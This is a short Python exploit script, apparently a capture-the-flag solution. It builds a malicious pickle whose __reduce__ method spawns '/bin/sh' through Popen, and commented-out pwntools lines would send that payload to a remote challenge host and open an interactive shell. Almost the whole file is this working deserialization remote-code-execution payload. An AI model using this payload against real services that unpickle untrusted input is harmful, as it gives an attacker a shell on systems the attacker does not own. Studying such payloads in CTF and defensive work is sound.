import marshal
import pickle
import pickletools
from subprocess import Popen

from pwn import *

# nc mc.ax 31773
# HOST, PORT = "mc.ax", 31773
# HOST, PORT = "127.0.0.1", 12223
# io = remote(HOST, PORT)


class RCE:
    def __reduce__(self):
        return Popen, ("/bin/sh",)


payload = pickle.dumps(RCE(), protocol=2)
print(payload)
pickletools.dis(payload)
# pickle.loads(payload)
print(payload.decode("latin-1").encode())
# io.sendlineafter(b":", payload)
# io.interactive()
